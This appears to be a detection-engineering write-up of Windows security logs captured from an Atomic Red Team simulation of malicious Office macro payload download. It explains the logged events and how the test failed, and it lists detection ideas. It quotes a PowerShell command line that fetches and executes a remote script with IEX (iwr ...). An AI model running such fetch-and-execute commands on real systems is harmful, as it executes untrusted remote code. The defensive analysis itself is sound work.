# T1204.002-9: Malicious File — Office Generic Payload Download

## Technique Context

T1204.002 User Execution: Malicious File focuses on attackers tricking users into executing malicious files, particularly through social engineering tactics. This technique is foundational to many attack chains, as it provides the initial foothold into an environment through user interaction. Office documents with embedded macros are a classic delivery mechanism, often arriving via email attachments or malicious websites.

The detection community focuses heavily on macro execution patterns, VBA analysis, file downloads from suspicious domains, and the behavioral patterns that occur when Office applications spawn child processes or make network connections. This particular test simulates an Office document that downloads a remote payload, representing a common attack vector where the initial document serves as a dropper that fetches additional malicious content.

## What This Dataset Contains

This dataset captures an Atomic Red Team test that attempts to simulate malicious Office macro execution using the `Invoke-MalDoc` PowerShell function. The test downloads a script from GitHub and attempts to create a Word document with VBA macro code that would download a remote payload.

Key events in Security logs show the PowerShell process creation with Security EID 4688, revealing the full command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)...}`. The PowerShell EID 4104 events capture the complete `Invoke-MalDoc` function definition, which shows functionality to create Office documents, add VBA macros, and execute them.

However, the test fails when attempting to instantiate the Word COM object, producing PowerShell EID 4100: "Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered". This indicates Microsoft Office is not installed on the test system.

Sysmon captures network activity with EID 22 showing DNS resolution for `raw.githubusercontent.com`, indicating the script successfully downloaded the remote payload file. Multiple Sysmon EID 7 events show .NET runtime loading, PowerShell automation DLL loading, and Windows Defender components being loaded into the PowerShell processes.

## What This Dataset Does Not Contain

The dataset lacks the actual Office document creation and macro execution that the technique is designed to test. Because Office is not installed (COM class not registered error), we don't see:
- Actual Word.exe or Excel.exe process creation
- Office application spawning child processes
- Registry modifications to enable VBA macro access (AccessVBOM)
- File creation of temporary Office documents
- The characteristic process tree of Office → child process execution

The test also doesn't capture what would happen if a malicious payload was successfully downloaded and executed, since the technique fails before reaching that stage. Windows Defender's real-time protection may have also influenced the execution flow, though no explicit blocking events are visible.

## Assessment

This dataset provides limited utility for building detections specifically for T1204.002 Office macro execution, since the core technique fails due to missing Office applications. However, it offers valuable telemetry for detecting the reconnaissance and preparation phases of such attacks.

The PowerShell script block logging captures the complete `Invoke-MalDoc` function, which could be valuable for signature-based detection of this specific tool. The network activity shows how attackers might stage payload downloads, and the command-line logging reveals the full attack chain even when execution fails.

For detection engineering focused on Office macro threats, this dataset would be more valuable if Office were installed and the macro execution succeeded. The current data is better suited for detecting PowerShell-based attack tools and remote payload staging.

## Detection Opportunities Present in This Data

1. **PowerShell Invoke-Expression with Web Requests**: Detect `IEX (iwr` patterns in PowerShell script blocks (EID 4104) indicating remote script execution.

2. **GitHub Raw Content Downloads**: Monitor DNS queries (Sysmon EID 22) for `raw.githubusercontent.com` which is commonly abused for hosting malicious payloads.

3. **Invoke-MalDoc Function Detection**: Create signatures for the specific `Invoke-MalDoc` function text captured in PowerShell script blocks.

4. **COM Object Creation Failures**: Monitor PowerShell errors (EID 4100) for Office COM object instantiation failures, which may indicate reconnaissance attempts.

5. **PowerShell Office Automation Attempts**: Detect command lines containing `Word.Application`, `Excel.Application`, or `VBProject` keywords indicating Office automation.

6. **Long PowerShell Command Lines**: Flag Security EID 4688 events with command lines exceeding normal length thresholds containing Office-related terms.

7. **Remote Script Download and Execution Chain**: Correlate DNS resolution events with subsequent PowerShell script block execution containing downloaded content.

8. **PowerShell .NET Runtime Loading Patterns**: Monitor unusual combinations of .NET DLL loading (Sysmon EID 7) in PowerShell processes that may indicate malicious automation.
